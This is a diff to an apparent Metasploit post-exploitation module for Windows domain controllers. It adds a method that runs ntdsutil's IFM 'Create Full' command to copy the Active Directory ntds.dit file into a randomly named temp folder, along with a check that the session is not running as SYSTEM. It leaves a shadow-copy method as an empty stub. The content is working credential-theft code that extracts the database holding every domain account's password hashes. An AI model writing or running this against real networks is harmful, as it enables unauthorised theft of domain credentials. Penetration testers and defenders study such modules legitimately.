@@ -31,7 +31,7 @@ class Metasploit3 < Msf::Post
 
   def run
     if preconditions_met?
-      copy_database_file
+      ntds_file = copy_database_file
     end
   end
 
@@ -39,11 +39,13 @@ class Metasploit3 < Msf::Post
     database_file_path = nil
     case  sysinfo["OS"]
       when /2003/
-
+        database_file_path = vss_method
       when /2008|2012/
+        database_file_path = ntdsutil_method
       else
         print_error "This version of Windows in unsupported"
     end
+    database_file_path
   end
 
   def is_domain_controller?
@@ -56,6 +58,20 @@ class Metasploit3 < Msf::Post
     end
     status
   end
+
+  def ntdsutil_method
+    tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
+    result = cmd_exec("ntdsutil.exe", command_arguments)
+    if result.include? "IFM media created successfully"
+      file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
+    else
+      print_error "There was an error copying the ntds.dit file!"
+      file_path = nil
+    end
+    file_path
+  end
+
 
   def preconditions_met?
     status = true
@@ -71,8 +87,15 @@ class Metasploit3 < Msf::Post
       print_error "This module requires UAC to be bypassed first"
       status = false
     end
+    if is_system?
+      print_error "Volume Shadow Copy will not work properly as SYSTEM, migrate to a real user"
+      status = false
+    end
     return status
   end
 
+  def vss_method
+
+  end
 
 end
